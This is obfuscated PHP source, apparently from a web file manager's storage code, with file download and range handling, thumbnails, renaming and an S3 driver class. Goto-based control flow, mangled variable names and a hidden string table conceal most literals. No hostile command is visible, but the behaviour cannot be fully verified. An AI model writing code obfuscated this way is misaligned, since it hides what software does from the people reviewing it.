‘Õ³³Ëæ; dˆ›„¢›ê: header($fŞø—ßÑÕ[120]); header($fŞø—ßÑÕ[121] . $cíÎâÔæÈ); $C¢‰‚âí×Ö = rawurlencode($cö—­…”œ‚); goto föÄÍº‘é; dƒÒäÒ”¯: if (in_array($eó¾ŸÄÊà, array($fŞø—ßÑÕ[111], $fŞø—ßÑÕ[112], $fŞø—ßÑÕ[113], $fŞø—ßÑÕ[114]))) { $eó¾ŸÄÊà = $fŞø—ßÑÕ[115]; } if (!$fŸ•¢³óÛÔ) { $fŸ•¢³óÛÔ = md5($B³é…Î°İø . $this->hashSimple($BƒŠœà”°Ò)); } $fŸ•¢³óÛÔ = $fŞø—ßÑÕ[116] . $fŸ•¢³óÛÔ . $fŞø—ßÑÕ[116]; goto E½Ş¬ È‚; bâ¤µâ»öá: header($fŞø—ßÑÕ[138] . $a…—’÷‰œ´); header($fŞø—ßÑÕ[139]); if (!$Cõ¿äñèê && $eó¾ŸÄÊà == $fŞø—ßÑÕ[140]) { if ($a…—’÷‰œ´ > 1024 * 1024 * 5) { die; } $dèã³Æ½„Ã = $this->getContent($BƒŠœà”°Ò); $dèã³Æ½„Ã = Html::clearSVG($dèã³Æ½„Ã); header($fŞø—ßÑÕ[141] . strlen($dèã³Æ½„Ã)); echo $dèã³Æ½„Ã; die; } goto eñˆÎœÒæÛ; AË†Õê«¶¢: $a…—’÷‰œ´ = $dë–¹Ñå·[$fŞø—ßÑÕ[78]]; $B³é…Î°İø = gmdate($fŞø—ßÑÕ[110], $dë–¹Ñå·[$fŞø—ßÑÕ[84]]); $cö—­…”œ‚ = $FæˆâØ£À· ? $FæˆâØ£À· : $this->iconvApp($dë–¹Ñå·[$fŞø—ßÑÕ[28]]); goto fğĞÓ‡ÕÈÖ; d ‘Õ³³Ëæ: header($fŞø—ßÑÕ[135] . $B³é…Î°İø . $fŞø—ßÑÕ[127]); header($fŞø—ßÑÕ[136] . $cö—­…”œ‚); header($fŞø—ßÑÕ[137]); goto bâ¤µâ»öá; föÄÍº‘é: $C¢‰‚âí×Ö = $fŞø—ßÑÕ[116] . $C¢‰‚âí×Ö . $fŞø—ßÑÕ[122] . $C¢‰‚âí×Ö; if ($Cõ¿äñèê) { header($fŞø—ßÑÕ[123]); header($fŞø—ßÑÕ[124] . $C¢‰‚âí×Ö); } else { header($fŞø—ßÑÕ[125] . $C¢‰‚âí×Ö); } header($fŞø—ßÑÕ[126] . gmdate($fŞø—ßÑÕ[110], time() + 3600 * 24 * 30) . $fŞø—ßÑÕ[127]); goto A£Ô…–Ô ; D÷ÎÜ™³¶ˆ: if ($DŒ•¿‰×éô) { $fµ°ø¦¡ÂÆ = intval(1000 * 1000 * ($aóµ¿å±®° / $DŒ•¿‰×éô)); } while ($dèÅÔ¢ó‚‘ <= $EÕÒšÄ×±Ù) { $f¢ÓØÈ„…‚ = timeFloat(); check_abort(); $Fª–»×Ú½ = $EÕÒšÄ×±Ù - $dèÅÔ¢ó‚‘ + 1; if ($Fª–»×Ú½ <= $aóµ¿å±®°) { $aóµ¿å±®° = $Fª–»×Ú½; } echo $this->fileSubstr($BƒŠœà”°Ò, $dèÅÔ¢ó‚‘, $aóµ¿å±®°); $dèÅÔ¢ó‚‘ += $aóµ¿å±®°; if ($aóµ¿å±®° == $Fª–»×Ú½) { $dèÅÔ¢ó‚‘ = $EÕÒšÄ×±Ù + 1; } if ($fµ°ø¦¡ÂÆ) { $aô¥ÔÖ«í = intval(1000 * 1000 * (timeFloat() - $f¢ÓØÈ„…‚)); $b‰×™êæğ = $fµ°ø¦¡ÂÆ - $aô¥ÔÖ«í; if ($b‰×™êæğ > 5) { usleep($b‰×™êæğ); } } } goto CÔÅÙšÛ‚¯; AÁÜÏ‘‡õÁ: $Dƒ§ß—Ç = $this->getType() == $fŞø—ßÑÕ[106]; $AÃ¦ÜÃÛ·‰ = $GLOBALS[$fŞø—ßÑÕ[6]][$fŞø—ßÑÕ[88]][$fŞø—ßÑÕ[107]][$fŞø—ßÑÕ[108]]; $DŒ•¿‰×éô = (double) $GLOBALS[$fŞø—ßÑÕ[6]][$fŞø—ßÑÕ[88]][$fŞø—ßÑÕ[107]][$fŞø—ßÑÕ[109]] * 1024 * 1024; goto Bò†ŒœÊó; fğĞÓ‡ÕÈÖ: $dèÅÔ¢ó‚‘ = 0; $EÕÒšÄ×±Ù = $a…—’÷‰œ´ - 1; $eó¾ŸÄÊà = $this->ext($cö—­…”œ‚); goto dƒÒäÒ”¯; A‰‰“´á¸: $fŞø—ßÑÕ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->cacheMethod(null, null); if (!$BƒŠœà”°Ò || !$this->exist($BƒŠœà”°Ò)) { show_json(LNG($fŞø—ßÑÕ[105]), !1, $FæˆâØ£À·); } goto AÁÜÏ‘‡õÁ; eñˆÎœÒæÛ: $Aò¶ñ¿‘ó = strtolower($_SERVER[$fŞø—ßÑÕ[142]]); if ($Dƒ§ß—Ç && $Aò¶ñ¿‘ó && $AÃ¦ÜÃÛ·‰) { if (strstr($Aò¶ñ¿‘ó, $fŞø—ßÑÕ[143])) { header($fŞø—ßÑÕ[144] . $BƒŠœà”°Ò); } else { if (strstr($Aò¶ñ¿‘ó, $fŞø—ßÑÕ[145])) { header($fŞø—ßÑÕ[146] . $BƒŠœà”°Ò); } else { if (strstr($Aò¶ñ¿‘ó, $fŞø—ßÑÕ[147])) { header($fŞø—ßÑÕ[148] . $BƒŠœà”°Ò); } } } if ($DŒ•¿‰×éô) { header($fŞø—ßÑÕ[149] . $DŒ•¿‰×éô); } return; } if (isset($_SERVER[$fŞø—ßÑÕ[150]])) { if (preg_match($fŞø—ßÑÕ[151], $_SERVER[$fŞø—ßÑÕ[150]], $a‹»ÔÛÅ°Û)) { $dèÅÔ¢ó‚‘ = intval($a‹»ÔÛÅ°Û[1]); if (!empty($a‹»ÔÛÅ°Û[2])) { $EÕÒšÄ×±Ù = intval($a‹»ÔÛÅ°Û[2]); } } header($fŞø—ßÑÕ[152]); header("\x43\x6f\x6e\164\145\x6e\x74\x2d\122\141\x6e\x67\145\72\40\x62\171\164\145\163\x20{$dèÅÔ¢ó‚‘}\55{$EÕÒšÄ×±Ù}\x2f" . $a…—’÷‰œ´); } else { header($fŞø—ßÑÕ[153]); } goto AééÙ†ÅÃõ; A£Ô…–Ô : header($fŞø—ßÑÕ[128]); header($fŞø—ßÑÕ[129]); header($fŞø—ßÑÕ[130]); goto F¢â§¦³ªŒ; E½Ş¬ È‚: $cíÎâÔæÈ = get_file_mime($eó¾ŸÄÊà); if (strstr($cíÎâÔæÈ, $fŞø—ßÑÕ[117])) { $cíÎâÔæÈ = $cíÎâÔæÈ . $fŞø—ßÑÕ[118]; } if ($Cõ¿äñèê === !1 && !mime_support($cíÎâÔæÈ)) { $Cõ¿äñèê = !0; $cíÎâÔæÈ = $fŞø—ßÑÕ[119]; } goto dˆ›„¢›ê; CÔÅÙšÛ‚¯: } public function fileOutServer($f‹÷Š«ÁÓ×, $D¿¥¹ˆƒ‚ = false, $Fåß¸íˆÜä = false, $CÀî·¦¿§£ = '') { $this->fileOut($f‹÷Š«ÁÓ×, $D¿¥¹ˆƒ‚, $Fåß¸íˆÜä, $CÀî·¦¿§£); } public function fileOutLink($AÊ¬•‰ë¶) { header($_SERVER[Ôğ—¤Šµˆ˜ñ£][159] . $AÊ¬•‰ë¶); die; } public function cacheMethod($FÛ¸›ÔÒƒ, $c¢õâ°©ÜÀ, $dÕŒÆºÚˆœ = null) { goto f‹×ë­İ°; fØÚÜ¾ğ‰: $a™ôŸŠÊÓï = $E™â³±[160] . $FÛ¸›ÔÒƒ . $E™â³±[161] . rtrim($cæÚº¹îôÁ, $E™â³±[8]); if (is_null($FÛ¸›ÔÒƒ)) { $Fˆ†°®ï = array(); return; } if (is_null($c¢õâ°©ÜÀ)) { unset($Fˆ†°®ï[$a™ôŸŠÊÓï]); return; } goto aéù‘Ú§•Õ; eŒ—íøŒë: $CïŠÃÃÈ½Ñ = $this->{$FÛ¸›ÔÒƒ}($c¢õâ°©ÜÀ); $Fˆ†°®ï[$a™ôŸŠÊÓï] = $CïŠÃÃÈ½Ñ; return $CïŠÃÃÈ½Ñ; goto eÙ³ÖÀ‡ÀĞ; aéù‘Ú§•Õ: if (!is_null($dÕŒÆºÚˆœ)) { $Fˆ†°®ï[$a™ôŸŠÊÓï] = $dÕŒÆºÚˆœ; return; } $CïŠÃÃÈ½Ñ = isset($Fˆ†°®ï[$a™ôŸŠÊÓï]) ? $Fˆ†°®ï[$a™ôŸŠÊÓï] : null; if (!is_null($CïŠÃÃÈ½Ñ)) { return $CïŠÃÃÈ½Ñ; } goto eŒ—íøŒë; f‹×ë­İ°: $E™â³± =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $Fˆ†°®ï = array(); $cæÚº¹îôÁ = $c¢õâ°©ÜÀ ? ltrim($this->getPathOuter($c¢õâ°©ÜÀ), $E™â³±[8]) : $c¢õâ°©ÜÀ; goto fØÚÜ¾ğ‰; eÙ³ÖÀ‡ÀĞ: } public function fileOutImage($Dà°Ÿù‚¼, $AáºÙÏ¿Ÿ§ = 250) { goto CˆÈÌøô; E§“¦ª¹’“: $DÅ¹Ø–¼ä¢ = $this->info($Dà°Ÿù‚¼); $aá­´‰ØŒâ = $DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[28]]; $aÆ…„¹…ê© = !1; goto eÈ‘­œ¦§î; a÷›ìŠßœ„: $a¬‡ÉõùâÌ = "{$e˜Ì“òÖº}\x5f{$AáºÙÏ¿Ÿ§}\56\160\156\147"; if (!($C´øœº­Ö = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $DŞÃÚß¬™Ö[172]))) { $FÃˆŠó‰êÏ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $DŞÃÚß¬™Ö[173]); } else { $FÃˆŠó‰êÏ = KodIO::make($C´øœº­Ö); } if ($C´øœº­Ö = IO::fileNameExist($FÃˆŠó‰êÏ, $a¬‡ÉõùâÌ)) { $bÄ¿Òä„Â± = KodIO::make($C´øœº­Ö); return IO::fileOut($bÄ¿Òä„Â±, !1, $aá­´‰ØŒâ); } goto CÖôÖÆºŠ; CˆÈÌøô: $DŞÃÚß¬™Ö =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; set_timeout(); if (substr($Dà°Ÿù‚¼, 0, 4) == $DŞÃÚß¬™Ö[147]) { $this->fileOutLink($Dà°Ÿù‚¼); } goto E§“¦ª¹’“; eÈ‘­œ¦§î: if (isset($GLOBALS[$DŞÃÚß¬™Ö[162]]) && $GLOBALS[$DŞÃÚß¬™Ö[162]][$DŞÃÚß¬™Ö[76]] == $DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[76]]) { $A‰¦÷ÆÂ¾½ = $GLOBALS[$DŞÃÚß¬™Ö[162]][$DŞÃÚß¬™Ö[163]]; if (!$DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[164]]) { $DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[164]] = $GLOBALS[$DŞÃÚß¬™Ö[162]]; } if (isset($A‰¦÷ÆÂ¾½[$DŞÃÚß¬™Ö[165]])) { if ($A‰¦÷ÆÂ¾½[$DŞÃÚß¬™Ö[165]] <= $AáºÙÏ¿Ÿ§ && $A‰¦÷ÆÂ¾½[$DŞÃÚß¬™Ö[166]] <= $AáºÙÏ¿Ÿ§) { $aÆ…„¹…ê© = !0; } } $aá­´‰ØŒâ = $DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[164]][$DŞÃÚß¬™Ö[28]]; } if ($DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[78]] <= 1024 * 50 || $aÆ…„¹…ê© || !function_exists($DŞÃÚß¬™Ö[167]) || $DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[168]] == $DŞÃÚß¬™Ö[169]) { return $this->fileOut($Dà°Ÿù‚¼, !1, $aá­´‰ØŒâ); } if (isset($DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[164]][$DŞÃÚß¬™Ö[170]])) { $e˜Ì“òÖº = $DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[164]][$DŞÃÚß¬™Ö[170]]; } else { if (isset($DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[164]][$DŞÃÚß¬™Ö[171]])) { $e˜Ì“òÖº = $DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[164]][$DŞÃÚß¬™Ö[171]]; } else { $e˜Ì“òÖº = md5("{$DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[28]]}\137{$DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[76]]}\x5f{$DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[78]]}"); } } goto a÷›ìŠßœ„; CÖôÖÆºŠ: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $bÄ¿Òä„Â± = DATA_THUMB . $a¬‡ÉõùâÌ; del_file($bÄ¿Òä„Â±); goto BÉó—ñ£â; BÉó—ñ£â: if (!@file_exists($bÄ¿Òä„Â±)) { $bÊ¼Ší”ø  = TEMP_FILES; if (!is_dir($bÊ¼Ší”ø )) { mk_dir($bÊ¼Ší”ø ); } $cÁÁ†Œ± = $bÊ¼Ší”ø  . $e˜Ì“òÖº . $DŞÃÚß¬™Ö[95] . $DÅ¹Ø–¼ä¢[$DŞÃÚß¬™Ö[168]]; if (!@file_exists($cÁÁ†Œ±)) { $cÁÁ†Œ± = $this->download($Dà°Ÿù‚¼, $cÁÁ†Œ±); } ImageThumb::createThumb($cÁÁ†Œ±, $bÄ¿Òä„Â±, $AáºÙÏ¿Ÿ§, $AáºÙÏ¿Ÿ§ * 10); } if (!file_exists($bÄ¿Òä„Â±) || filesize($bÄ¿Òä„Â±) < 100) { return @file_exists($cÁÁ†Œ±) ? IO::fileOut($cÁÁ†Œ±) : $this->fileOut($Dà°Ÿù‚¼); } if (!($aù«µä™Î« = IO::move($bÄ¿Òä„Â±, $FÃˆŠó‰êÏ))) { return IO::fileOut($bÄ¿Òä„Â±); } goto BŒÆ±šÅñ; BŒÆ±šÅñ: del_file($bÄ¿Òä„Â±); IO::fileOut($aù«µä™Î«); goto eƒê­¥çéß; eƒê­¥çéß: } public function fileOutImageServer($eãâœ¥âÌ, $Fö›”Âµ¡‚ = 250) { $this->fileOutImage($eãâœ¥âÌ, $Fö›”Âµ¡‚); } public function fileNameAuto($DŞ“ÃÉ†¦Ø, $f´Ô²™öÈš, $dùÔë˜ğ  = REPEAT_RENAME, $f‰ªœŒ»Í = false) { goto cÄŠ¶ó×Îñ; cÄŠ¶ó×Îñ: $BŒœ½ÑÄé“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a˜ÕèŸ—‹Ï = $DŞ“ÃÉ†¦Ø === $BŒœ½ÑÄé“[33] ? $f´Ô²™öÈš : rtrim($DŞ“ÃÉ†¦Ø, $BŒœ½ÑÄé“[8]) . $BŒœ½ÑÄé“[8] . $f´Ô²™öÈš; if ($dùÔë˜ğ  == REPEAT_REPLACE || !$this->exist($a˜ÕèŸ—‹Ï) || $f‰ªœŒ»Í && $dùÔë˜ğ  != REPEAT_RENAME_FOLDER) { return $f´Ô²™öÈš; } goto a¨ÄËßÉ‘Æ; a¨ÄËßÉ‘Æ: if ($dùÔë˜ğ  == REPEAT_SKIP) { return !1; } $a”ø“…â¶¯ = $BŒœ½ÑÄé“[95] . get_path_ext($f´Ô²™öÈš); $a”ø“…â¶¯ = $a”ø“…â¶¯ == $BŒœ½ÑÄé“[95] || $f‰ªœŒ»Í ? $BŒœ½ÑÄé“[33] : $a”ø“…â¶¯; goto bËÅ¬¾Şò•; E…·®İ·ÌŒ: while ($this->exist(rtrim($DŞ“ÃÉ†¦Ø, $BŒœ½ÑÄé“[8]) . $BŒœ½ÑÄé“[8] . $EÙŞÛ£·Ñ†)) { $EÙŞÛ£·Ñ† = $b‚¥Ï¾ÃÑ¾ . "\50{$e®Ò»Ğƒ®Ğ}\x29{$a”ø“…â¶¯}"; $e®Ò»Ğƒ®Ğ++; } return $EÙŞÛ£·Ñ†; goto DÑÄØ’–·; bËÅ¬¾Şò•: $e®Ò»Ğƒ®Ğ = 1; $b‚¥Ï¾ÃÑ¾ = substr($f´Ô²™öÈš, 0, strlen($f´Ô²™öÈš) - strlen($a”ø“…â¶¯)); $EÙŞÛ£·Ñ† = $b‚¥Ï¾ÃÑ¾ . "\50{$e®Ò»Ğƒ®Ğ}\51{$a”ø“…â¶¯}"; goto E…·®İ·ÌŒ; DÑÄØ’–·: } private function fileNameAutoList($Cß†¢§½ÇŞ, $fäî£…Í, $b˜±÷’óÅ = false) { goto C‡¿¤³É¯¨; c«‰‚÷Á: $C¿«ÌÏ¦÷Å = substr($fäî£…Í, 0, strlen($fäî£…Í) - strlen($F‚¿Öâ®ç)); $D‚Ğ˜­Ì©¥ = $C¿«ÌÏ¦÷Å . "\50\60\x29{$F‚¿Öâ®ç}"; for ($F–Ò¼‡ò˜ = 1; $F–Ò¼‡ò˜ <= count($F äó—µÓ…) + 1; $F–Ò¼‡ò˜++) { $D‚Ğ˜­Ì©¥ = $C¿«ÌÏ¦÷Å . "\50{$F–Ò¼‡ò˜}\51{$F‚¿Öâ®ç}"; if (!in_array_not_case($D‚Ğ˜­Ì©¥, $F äó—µÓ…)) { return $D‚Ğ˜­Ì©¥; } } goto E¡½ô™´­ª; Ağß¨¬—Ö: $F äó—µÓ… = array_to_keyvalue($ešÁê‘„ƒ³, $D¸‘³ö­±‰[33], $D¸‘³ö­±‰[28]); $F‚¿Öâ®ç = $D¸‘³ö­±‰[95] . get_path_ext($fäî£…Í); $F‚¿Öâ®ç = $F‚¿Öâ®ç == $D¸‘³ö­±‰[95] || $b˜±÷’óÅ ? $D¸‘³ö­±‰[33] : $F‚¿Öâ®ç; goto c«‰‚÷Á; C‡¿¤³É¯¨: $D¸‘³ö­±‰ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $ešÁê‘„ƒ³ = $this->listPath($Cß†¢§½ÇŞ, !0); $ešÁê‘„ƒ³ = array_merge($ešÁê‘„ƒ³[$D¸‘³ö­±‰[75]], $ešÁê‘„ƒ³[$D¸‘³ö­±‰[74]]); goto Ağß¨¬—Ö; E¡½ô™´­ª: return $D‚Ğ˜­Ì©¥; goto c‡…‘ØƒÑ•; c‡…‘ØƒÑ•: } public function listAllFiles($BØ›Õ‚¶¥’, $C²éÏÜì¶÷, $a–»éÈ¬¡Ä = array()) { goto Fˆ–Ù¶ó¬Â; BâÛ‹ù…§œ: $BØ›Õ‚¶¥’ = trim($BØ›Õ‚¶¥’, $Dàª„¨ùÕå[8]); foreach ($C²éÏÜì¶÷ as $Dáà·£„ùÔ) { $AĞ¦ª©ÆÖ¸ = ltrim(substr(trim($Dáà·£„ùÔ, $Dàª„¨ùÕå[8]), strlen($BØ›Õ‚¶¥’)), $Dàª„¨ùÕå[8]); $dãøÈ£Œ½é = array_merge($dãøÈ£Œ½é, $this->slicePath($AĞ¦ª©ÆÖ¸)); } $DÑ¹¾Å’‘µ = array(); goto dš»‘‰Œ´; Fˆ–Ù¶ó¬Â: $Dàª„¨ùÕå =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($C²éÏÜì¶÷)) { return array(); } $dãøÈ£Œ½é = array(); goto BâÛ‹ù…§œ; dš»‘‰Œ´: foreach (array_unique($dãøÈ£Œ½é) as $Dáà·£„ùÔ) { $fÉ¿¥í¬Á = array($Dàª„¨ùÕå[76] => $this->getPathOuter($Dàª„¨ùÕå[8] . $BØ›Õ‚¶¥’ . $Dàª„¨ùÕå[8] . $Dáà·£„ùÔ), $Dàª„¨ùÕå[77] => 1, $Dàª„¨ùÕå[78] => 0); if (substr($Dáà·£„ùÔ, -1) != $Dàª„¨ùÕå[8]) { $fÉ¿¥í¬Á[$Dàª„¨ùÕå[77]] = 0; $d½Í¡Ã˜¹ = $this->getPath($BØ›Õ‚¶¥’ . $Dàª„¨ùÕå[8] . $Dáà·£„ùÔ); $fÉ¿¥í¬Á[$Dàª„¨ùÕå[78]] = isset($a–»éÈ¬¡Ä[$d½Í¡Ã˜¹]) ? $a–»éÈ¬¡Ä[$d½Í¡Ã˜¹] : $this->size($d½Í¡Ã˜¹); } $DÑ¹¾Å’‘µ[] = $fÉ¿¥í¬Á; } return $DÑ¹¾Å’‘µ; goto e ©´ëÙ’º; e ©´ëÙ’º: } public function slicePath($cßÎêã Àá) { $BÁÅõõĞÚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B‚ÂÀøÁ±§ = explode($BÁÅõõĞÚ[8], trim($cßÎêã Àá, $BÁÅõõĞÚ[8])); $A ÉŒ²ó = 0; do { ++$A ÉŒ²ó; $eºî’í¹÷ø[] = implode($BÁÅõõĞÚ[8], array_slice($B‚ÂÀøÁ±§, 0, $A ÉŒ²ó)) . $BÁÅõõĞÚ[8]; } while ($A ÉŒ²ó < count($B‚ÂÀøÁ±§)); $eºî’í¹÷ø[count($B‚ÂÀøÁ±§) - 1] = $cßÎêã Àá; return $eºî’í¹÷ø; } public function getHost() { $A¹ù÷Û«ŞĞ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E…¡…ÊˆÏÆ = parse_url(trim($this->domain, $A¹ù÷Û«ŞĞ[8])); $D…í¹×’ = isset($E…¡…ÊˆÏÆ[$A¹ù÷Û«ŞĞ[174]]) ? $E…¡…ÊˆÏÆ[$A¹ù÷Û«ŞĞ[174]] : http_type(); $f…°óÒ¾‚Á = isset($E…¡…ÊˆÏÆ[$A¹ù÷Û«ŞĞ[175]]) ? $E…¡…ÊˆÏÆ[$A¹ù÷Û«ŞĞ[175]] : $E…¡…ÊˆÏÆ[$A¹ù÷Û«ŞĞ[76]]; if (isset($E…¡…ÊˆÏÆ[$A¹ù÷Û«ŞĞ[176]])) { $f…°óÒ¾‚Á .= $A¹ù÷Û«ŞĞ[4] . $E…¡…ÊˆÏÆ[$A¹ù÷Û«ŞĞ[176]]; } return $D…í¹×’ . $A¹ù÷Û«ŞĞ[177] . $f…°óÒ¾‚Á; } public function pathEncode($b„¢ïˆ¨§ø) { $E½™ˆº„œî =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return str_replace($E½™ˆº„œî[178], $E½™ˆº„œî[8], rawurlencode($b„¢ïˆ¨§ø)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($fÃÕÏÒÂÕª) { set_timeout(); require_once SDK_DIR . $_SERVER[Ôğ—¤Šµˆ˜ñ£][179]; parent::__construct(); $this->_init($fÃÕÏÒÂÕª); } public function _init($c¢‰ïÀ›Üœ) { foreach ($c¢‰ïÀ›Üœ as $Dä‘ÀÙê×ñ => $B»¥¶‚Ÿ”É) { if (isset($this->{$Dä‘ÀÙê×ñ})) { $this->{$Dä‘ÀÙê×ñ} = $B»¥¶‚Ÿ”É; } } $this->endpoint = $c¢‰ïÀ›Üœ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($a‚›‹åÜôÚ = "\166\x34") { $this->signVer = $a‚›‹åÜôÚ; $this->client->setSignatureVersion($a‚›‹åÜôÚ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto D¸³æ‚É£á; d©Òš•ã…å: $F˜ŠñäŠ = array($D£Ï‹ÒÛå•[186], $D£Ï‹ÒÛå•[187], $D£Ï‹ÒÛå•[188], $D£Ï‹ÒÛå•[189], $D£Ï‹ÒÛå•[190]); $d™Şõ–³Ù = array_diff($F˜ŠñäŠ, $FŞİ‘šõÔ×); return empty($d™Şõ–³Ù); goto C²Óä‹Í“®; D¸³æ‚É£á: $D£Ï‹ÒÛå• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cøöİ¸‡Ç = $this->getBucketCors(); if (!$cøöİ¸‡Ç || !is_array($cøöİ¸‡Ç)) { return !1; } goto AÆØ…Ûæ©÷; AÆØ…Ûæ©÷: if ($cøöİ¸‡Ç[$D£Ï‹ÒÛå•[181]] != $D£Ï‹ÒÛå•[182] || $cøöİ¸‡Ç[$D£Ï‹ÒÛå•[183]] != $D£Ï‹ÒÛå•[182]) { return !1; } $FŞİ‘šõÔ× = array_map($D£Ï‹ÒÛå•[184], $cøöİ¸‡Ç[$D£Ï‹ÒÛå•[185]]); if (!is_array($FŞİ‘šõÔ×)) { $FŞİ‘šõÔ× = array(); } goto d©Òš•ã…å; C²Óä‹Í“®: } public function mkfile($EõÛ§Ô…º, $f„‘Ù‚”Ç„ = '', $bŞˆ‹­³Ä® = REPEAT_RENAME) { $E«ì‘ĞãÖ¿ = $this->setContent($EõÛ§Ô…º, $f„‘Ù‚”Ç„); if ($E«ì‘ĞãÖ¿ !== !1) { return $this->getPathOuter($EõÛ§Ô…º); } return !1; } public function mkdir($e³„ß³ëŠÉ, $fèÏßŒ®é° = REPEAT_SKIP) { $EõÑäë‡½ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($e³„ß³ëŠÉ) && $e³„ß³ëŠÉ !== $EõÑäë‡½[191]) { return !1; } if ($this->_isFolder($e³„ß³ëŠÉ)) { return $this->getPathOuter($e³„ß³ëŠÉ); } $CÁŠõĞÁ–× = $this->setContent($e³„ß³ëŠÉ, $EõÑäë‡½[33], !0); if ($CÁŠõĞÁ–× !== !1) { return $this->getPathOuter($e³„ß³ëŠÉ); } return !1; } public function copyFile($C‹¸¡Ä¹İ´, $e¬Œ¦¢‰, $E·µ°ìˆ‚Á = array()) { $BÉ¬½‘ÃÒó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C‰—õØ®Ñ‰ = $this->objectMeta($C‹¸¡Ä¹İ´); if (!$C‰—õØ®Ñ‰) { return !1; } if ($C‰—õØ®Ñ‰[$BÉ¬½‘ÃÒó[78]] <= 1024 * 1024 * 200) { $DÑ¸öİƒŠ­ = $this->client->copyObject($this->bucket, $C‹¸¡Ä¹İ´, $this->bucket, $e¬Œ¦¢‰, $BÉ¬½‘ÃÒó[192], $E·µ°ìˆ‚Á); } else { $DÑ¸öİƒŠ­ = $this->client->multiCopyObject($this->bucket, $C‹¸¡Ä¹İ´, $this->bucket, $e¬Œ¦¢‰, $E·µ°ìˆ‚Á); } $DÑ¸öİƒŠ­ = $DÑ¸öİƒŠ­ ? $this->getPathOuter($e¬Œ¦¢‰) : !1; return $DÑ¸öİƒŠ­; } public function moveFile($b™Ì—‘À”, $AÙè„ùÚì) { if ($this->copyFile($b™Ì—‘À”, $AÙè„ùÚì)) { $this->delFile($b™Ì—‘À”); return $this->getPathOuter($AÙè„ùÚì); } return !1; } public function delFile($dÚê³²²¹) { return $this->client->deleteObject($this->bucket, $dÚê³²²¹); } public function delFolder($CÄÌÅ©Ì–) { goto EŞòñ¦“§Í; F‚õØã÷: if (!empty($CÄÌÅ©Ì–) && $CÄÌÅ©Ì– !== $CŒŠè¼š×ó[191] && !in_array($DÆĞÇíæÓá, $FÏâÉñæÜ´[$CŒŠè¼š×ó[75]])) { $FÏâÉñæÜ´[$CŒŠè¼š×ó[75]][] = $DÆĞÇíæÓá; } $aÒğÏËãä» = $this->delByBatch($FÏâÉñæÜ´[$CŒŠè¼š×ó[74]]); if (!$aÒğÏËãä») { return !1; } goto aƒ…˜Õ; Bà‰‹‹¬‚Ğ: $FÏâÉñæÜ´ = $this->fileList($CÄÌÅ©Ì–); $this->listItemCache = !0; $DÆĞÇíæÓá = trim($CÄÌÅ©Ì–, $CŒŠè¼š×ó[8]) . $CŒŠè¼š×ó[8]; goto F‚õØã÷; aƒ…˜Õ: $aÒğÏËãä» = $this->delByBatch($FÏâÉñæÜ´[$CŒŠè¼š×ó[75]]); if (!$aÒğÏËãä») { return !1; } return $this->delFile($DÆĞÇíæÓá); goto FÏèîÇ·áƒ; EŞòñ¦“§Í: $CŒŠè¼š×ó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->exist($CÄÌÅ©Ì–)) { return !0; } $this->listItemCache = !1; goto Bà‰‹‹¬‚Ğ; FÏèîÇ·áƒ: } private function delByBatch($Eò‰¡èĞ‡) { foreach (array_chunk($Eò‰¡èĞ‡, 1000) as $c­†š¨’‰™) { $D§ê”éº˜¢ = $this->client->deleteObjects($this->bucket, $c­†š¨’‰™); if (!$D§ê”éº˜¢) { return !1; } } return !0; } public function rename($fä³¶î¿‹š, $Cñó„Õóªî) { return $this->renameObject($fä³¶î¿‹š, $Cñó„Õóªî); } public function listPath($bÃÏ”¤…âè, $fß¡„Å¿¥ = false) { $FŸÍÇƒä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $açœ˜’ŠÀ = $this->fileList($bÃÏ”¤…âè, $FŸÍÇƒä[8], !0); foreach ($açœ˜’ŠÀ[$FŸÍÇƒä[75]] as $a‹è¥¾ùøª => $A‰Âğ„óÏì) { $açœ˜’ŠÀ[$FŸÍÇƒä[75]][$a‹è¥¾ùøª] = $this->folderInfo($A‰Âğ„óÏì, $fß¡„Å¿¥); } foreach ($açœ˜’ŠÀ[$FŸÍÇƒä[74]] as $a‹è¥¾ùøª => $A‰Âğ„óÏì) { 